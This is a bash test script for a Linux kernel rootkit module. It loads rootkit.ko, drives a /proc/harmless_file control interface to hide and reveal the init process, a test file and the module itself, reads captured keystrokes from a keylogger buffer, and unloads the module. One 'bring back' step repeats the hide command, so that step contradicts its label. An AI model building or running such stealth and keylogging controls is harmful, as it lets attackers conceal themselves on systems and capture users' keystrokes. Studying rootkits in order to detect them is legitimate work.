#!/usr/bin/bash
echo loading module
insmod rootkit.ko
echo testing proc hiding
echo hiding init
echo "ps -e | grep init:`ps -e | grep init`"
echo hide 1 > /proc/harmless_file/hide_pid
echo "ps -e | grep init:`ps -e | grep init`"
echo bringing init back to light
echo hide 1 > /proc/harmless_file/hide_pid
echo "ps -e | grep init:`ps -e | grep init`"
echo testing file hiding functionality
mkdir test
touch test/hideme
echo "ls -l test:"`ls -l test`
echo hiding file
echo "hide `pwd`/test/hideme" > /proc/harmless_file/hide_file
echo "ls -l test:"`ls -l test`
echo showing file
echo "show `pwd`/test/hideme" > /proc/harmless_file/hide_file
echo "ls -l test:"`ls -l test`
echo testing module hiding functionality
echo "lsmod | grep rootkit:"`lsmod | grep rootkit`
echo hiding module
echo 1 > /proc/harmless_file/hide_module
echo "lsmod | grep rootkit:"`lsmod | grep rootkit`
echo bringing init module to light
echo 0 > /proc/harmless_file/hide_module
echo "lsmod | grep rootkit:"`lsmod | grep rootkit`
echo "keylogger test , i\'m assuming that something has been typed "
echo "cat /proc/harmless_file/keylogger"
cat /proc/harmless_file/keylogger
echo unloading module
rmmod rootkit
